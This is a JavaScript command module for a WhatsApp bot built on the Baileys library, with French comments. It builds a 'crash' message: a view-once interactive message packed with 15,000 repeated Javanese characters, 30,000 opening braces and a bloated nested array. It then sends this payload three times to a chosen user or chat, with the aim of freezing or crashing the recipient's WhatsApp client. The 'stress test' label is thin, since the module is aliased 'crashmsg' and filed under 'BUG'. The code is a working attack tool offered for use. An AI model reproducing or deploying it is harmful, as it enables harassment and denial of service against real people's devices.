import { prepareWAMessageMedia } from "@whiskeysockets/baileys";

export default {
  name: "blank",
  alias: ["blankhard", "crashmsg"],
  description: "Envoie une charge utile lourde et complexe (Owner Only)",
  category: "BUG",
  group: false,
  admin: false,
  botAdmin: false,
  ownerOnly: true,

  async execute(kaya, mek, from, args, prefix) {
    try {
      // 🔐 Récupération sécurisée de l'ID du propriétaire du bot
      const ownerId = kaya.user?.id ? kaya.user.id.split(':')[0] : '';
      if (!ownerId) {
        return await kaya.sendMessage(from, { text: "❌ Erreur : Impossible de récupérer l'ID du propriétaire du bot." }, { quoted: mek });
      }

      // Cible : Soit le salon actuel, soit un utilisateur mentionné/fourni en argument
      const target = args[0] ? args[0] + "@s.whatsapp.net" : from;

      // 1. Préparation du média avec une image de secours / par défaut
      const media = await prepareWAMessageMedia(
        { image: { url: "https://files.catbox.moe/g3w96d.jpg" } },
        { upload: kaya.waUploadToServer }
      ).catch(() => null);

      // 2. Charge utile interactive lourde avec surcharge de paramètres natifs
      const heavyInteractiveMsg = {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "💥 SYSTEM OVERLOAD 💥",
                hasMediaAttachment: true,
                imageMessage: media?.imageMessage || null
              },
              body: {
                text: "⚠️ KAYA BOT STRESS TEST PAYLOAD ⚠️\n" + "ꦾ".repeat(15000)
              },
              footer: {
                text: "KAY BOT ENGINE ϟ"
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: JSON.stringify({
                      display_text: "⚡ EXECUTE CRASH " + "ꦾ".repeat(500),
                      id: ".crash_trigger"
                    })
                  }
                ],
                messageParamsJson: JSON.stringify({
                  payload: "{".repeat(30000),
                  nested: Array(200).fill("A".repeat(500))
                })
              }
            }
          }
        }
      };

      // Envoi de la charge principale en boucle rapide pour forcer la saturation
      for (let i = 0; i < 3; i++) {
        await kaya.relayMessage(target, heavyInteractiveMsg, {
          messageId: kaya.generateMessageTag()
        });
        // Petite pause pour stabiliser l'envoi
        await new Promise(resolve => setTimeout(resolve, 200));
      }

      // Confirmation de l'envoi
      await kaya.sendMessage(from, { text: "⚡ Charge utile interactive lourde déployée avec succès !" }, { quoted: mek });

    } catch (err) {
      console.error("❌ Erreur dans la commande blank :", err);
      await kaya.sendMessage(from, { text: `Erreur d'exécution : ${err.message}` }, { quoted: mek });
    }
  }
};
